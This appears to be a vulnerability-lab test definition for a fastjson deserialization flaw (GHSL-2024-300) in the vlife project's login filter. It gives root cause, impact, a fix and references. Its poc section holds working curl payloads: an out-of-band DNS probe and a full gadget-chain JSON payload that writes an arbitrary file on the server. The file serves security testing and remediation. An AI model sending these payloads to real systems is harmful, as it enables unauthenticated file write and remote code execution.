@@ -1,0 +1,106 @@
+id: vt-vlife
+
+info:
+  name: "Vlife FastJSON Deserialization to RCE (GHSL-2024-300)"
+  author: omarkurt
+  description: |
+    wwwlike/vlife uses alibaba/fastjson v1.2.67 in its authentication filter
+    (MyUsernamePasswordAuthenticationFilter). The filter reads the HTTP request body
+    and passes it directly to JSON.parseObject() without any type validation or
+    filtering. This allows unauthenticated attackers to send crafted JSON payloads
+    with @type directives to instantiate arbitrary Java classes, leading to
+    Remote Code Execution via known fastjson gadget chains (file write,
+    JNDI injection, etc.).
+  targets:
+    - vlife
+  type: GHSL
+  ghsl: GHSL-2024-300
+  cwe: CWE-502
+  cvss:
+    score: 9.8
+    severity: critical
+  affected_versions:
+    - "main branch as of 2024-10-09"
+  fixed_version: "unpatched (PR #4 open)"
+  tags:
+    - deserialization
+    - fastjson
+    - rce
+    - unauthenticated
+    - java
+    - spring-boot
+
+vulnerabilities:
+  - id: fastjson-deser-auth-filter
+    name: "FastJSON Deserialization via Authentication Filter"
+    endpoint: /vlife/login
+    method: POST
+    param: request body (JSON)
+    authentication:
+      type: none
+      required: false
+
+technical: |
+  Root Cause:
+  - MyUsernamePasswordAuthenticationFilter.java (line 72) calls JSON.parseObject(body)
+    on the raw HTTP request body without any input validation
+  - fastjson v1.2.67 is vulnerable to multiple autoType bypass techniques
+  - The authentication filter processes the request body BEFORE authentication,
+    so the vulnerability is exploitable by unauthenticated users
+
+  Gadget Chain (from advisory PoC - file write):
+  - sun.rmi.server.MarshalOutputStream -> java.util.zip.InflaterOutputStream
+    -> java.io.FileOutputStream
+  - Allows arbitrary file write on the server filesystem
+
+  Attack Flow:
+  1. Attacker sends POST /login with Content-Type: application/json
+  2. Authentication filter intercepts the request and reads the body
+  3. JSON.parseObject() deserializes the body, honoring @type directives
+  4. Gadget chain is instantiated, executing attacker-controlled operations
+  5. Authentication result is irrelevant - damage is done during parsing
+
+impact: |
+  - Remote Code Execution (RCE) without authentication
+  - Arbitrary file write on the server
+  - Full server compromise via gadget chain exploitation
+  - JNDI injection for remote class loading
+
+remedy: |
+  1. Upgrade fastjson from 1.2.67 to 2.0.60+ (see PR #4)
+  2. Replace JSON.parseObject() with a safe deserializer that does not support
+     polymorphic type resolution (e.g., Jackson with default typing disabled)
+  3. Implement input validation on the authentication filter to only accept
+     expected fields (username, password)
+
+references:
+  - "https://securitylab.github.com/advisories/GHSL-2024-300_wwwlike_vlife/"
+  - "https://github.com/wwwlike/vlife"
+  - "https://github.com/wwwlike/vlife/pull/4"
+  - "https://cwe.mitre.org/data/definitions/502.html"
+
+poc:
+  nuclei:
+    - "vt-vlife.nuclei.yaml"
+  manual:
+    steps:
+      - "1. docker-compose up -d --build"
+      - "2. Wait for application startup (~60s)"
+      - "3. Send crafted JSON to POST /login with @type payload"
+      - "4. Verify OOB callback or file write on server"
+  curl_examples:
+    - name: "FastJSON deserialization OOB test"
+      command: |
+        curl -s -X POST http://localhost:8288/vlife/login \
+          -H "Content-Type: application/json" \
+          -d '{"@type":"java.net.Inet4Address","val":"YOUR_CALLBACK_HOST"}'
+    - name: "FastJSON file write PoC"
+      command: |
+        curl -s -X POST http://localhost:8288/vlife/login \
+          -H "Content-Type: application/json" \
+          -d '{"@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"java.io.FileOutputStream","file":"/tmp/pwned.txt","append":false},"infl":{"input":{"array":"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=="}},"bufLen":1048576},"protocolVersion":1}'
+
+providers:
+  docker-compose:
+    path: "docker-compose.yaml"
+    port: 8288
